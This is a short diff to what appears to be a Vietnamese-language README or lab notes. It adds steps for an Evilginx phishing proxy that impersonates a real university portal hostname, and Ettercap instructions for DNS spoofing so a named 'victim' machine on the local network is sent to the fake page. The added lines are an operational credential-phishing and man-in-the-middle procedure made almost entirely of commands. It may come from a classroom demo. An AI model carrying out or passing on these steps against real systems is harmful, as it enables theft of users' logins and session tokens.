@@ -137,4 +137,11 @@ sudo ./evilginx -p ../phishlets -developer
 phishlets hostname demo thongtindaotao.sgu.edu.vn
 phishlets enable demo
 lures create demo
+lures edit 0 path / #ĐỂ VICTIM TRUY CẬP VÀO thongtindaotao.sgu.edu.vn LÀ VÀO THẲNG TRANG FAKE, KHÔNG CẦN DÙNG LURES
 lures get-url 0 #NẾU TEST NHIỀU LẦN THÌ SỐ 0 NÀY SẼ LẤY TỪ CÂU LỆNH TRÊN
+```
+
+## BẬT ETTERCAP:
+```ettercap -G```
+QUY TRÌNH: SCAN HOST (THƯỜNG SẼ CHO RA KHOẢNG 4 HOST) --> ADD 192.168.100.150 VÀO TARGET 1 --> BẬT PLUGIN DNS SPOOF_DNS ĐỂ GỬI DNS QUERY CHO MÁY VICTIM 
+KHI NÀY NGƯỜI DÙNG NẾU NHẬP thongtindaotao.sgu.edu.vn sẽ ra trang fake
